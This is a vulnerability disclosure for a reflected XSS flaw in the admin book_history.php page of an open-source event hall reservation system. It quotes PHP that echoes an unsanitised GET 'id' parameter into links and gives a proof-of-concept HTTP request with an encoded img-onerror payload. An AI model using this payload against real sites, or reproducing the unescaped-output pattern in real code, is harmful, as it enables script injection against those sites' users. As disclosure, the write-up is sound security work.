# MAGESH-K21 / Online-College-Event-Hall-Reservation-System - Reflected XSS book_history.php

## **Credits**
> Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)<br/>

## Vendor Homepage:
> https://github.com/MAGESH-K21/Online-College-Event-Hall-Reservation-System/

## Affected Component
> /admin/book_history.php

## Code
```php
$id = $_GET['id'];

 <li><a class="dropdown-item" href="book_history.php?id=<?php echo $id; ?>&filter=Today">Today</a></li>
            <li><a class="dropdown-item" href="book_history.php?id=<?php echo $id; ?>&filter=Week">This Week</a></li>
            <li><a class="dropdown-item" href="book_history.php?id=<?php echo $id; ?>&filter=Month">This Month</a></li>
            <li><a class="dropdown-item" href="book_history.php?id=<?php echo $id; ?>&filter=User">User Cancelled</a></li>
            <li><a class="dropdown-item" href="book_history.php?id=<?php echo $id; ?>&filter=Admin">Admin Cancelled</a></li>
            <li><a class="dropdown-item" href="book_history.php?id=<?php echo $id; ?>">All</a></li>
```

## Proof of Concept
**HTTP Request Example**
``` http request
GET /admin/book_history.php?id=%22%3E%3Cimg%20src=x%20onerror=alert(%22NoChizPlz%22)%3E HTTP/1.1
Host: [REDACTED]
```

## Screenshot
![image](https://github.com/skid-nochizplz/skid-nochizplz/assets/60700937/0c9e0749-9d44-4742-b12a-1c2601211053)

